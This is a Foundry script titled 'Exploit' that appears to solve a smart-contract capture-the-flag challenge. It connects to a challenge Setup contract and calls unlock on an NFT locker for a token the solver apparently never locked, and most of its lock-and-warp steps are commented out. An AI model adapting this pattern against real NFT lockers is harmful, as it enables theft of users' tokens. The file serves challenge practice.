// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/console.sol";
import { VmSafe } from "forge-std/Vm.sol";
import { Script } from "forge-std/Script.sol";
import { Setup } from "../src/Setup.sol";
import { ChovidLocker } from "../src/ChovidLocker.sol";
import { ChovidNFT } from "../src/ChovidNFT.sol";

contract Exploit is Script {
  VmSafe.Wallet public solver;
  Setup public _setup;
  ChovidLocker public locker;
  ChovidNFT public nft;
  uint256 public constant EPOCH_DURATION = 44 seconds;

  struct LockInput {
      address recipient;
      uint256 tokenId;
  }

  function setUp() public {
    _setup = Setup(vm.envAddress("SETUP_CONTRACT"));
    locker = ChovidLocker(payable(address(_setup.chovidLocker())));
    nft = ChovidNFT(address(_setup.chovidNFT()));
    solver = vm.createWallet(uint256(vm.envBytes32("PRIVATE_KEY")));

    console.log("Solver Addr: ", solver.addr);
    console.log("Setup Addr: ", address(_setup));
    console.log("Locker Addr: ", address(locker));
    console.log("NFT Addr: ", address(nft));
    console.log("Locked NFT: ", locker.totalLockedNFT());
  }

  function run() public {
    vm.startBroadcast(solver.privateKey);

    uint256[] memory tokenIds = new uint256[](3);
    // tokenIds[0] = _setup.airdropNFT();
    // tokenIds[1] = _setup.airdropNFT();
    // tokenIds[2] = _setup.airdropNFT();
    console.log("Minted NFTs: ", _setup.totalMinted());

    // for (uint256 i = 0; i < tokenIds.length; i++) {
      // nft.approve(address(locker), tokenIds[i]);
    //   ChovidLocker.LockInput[] memory inputs = new ChovidLocker.LockInput[](1);
    //   inputs[0] = ChovidLocker.LockInput({
    //       recipient: solver.addr,
    //       tokenId: tokenIds[i]
    //   });
      // locker.lock(inputs);
    //   vm.warp(block.timestamp + 44);
    // }

    // tokenIds[0] = _setup.airdropNFT();
    // nft.approve(address(locker), tokenIds[0]);
    
    // ChovidLocker.LockInput[] memory inputs = new ChovidLocker.LockInput[](1);
    // inputs[0] = ChovidLocker.LockInput({
    //     recipient: solver.addr,
    //     tokenId: 1
    // });
    // locker.lock(inputs);

    uint256[] memory anotherTokenIds = new uint256[](1);
    anotherTokenIds[0] = 1;
    locker.unlock(anotherTokenIds);

    vm.stopBroadcast();
  }
}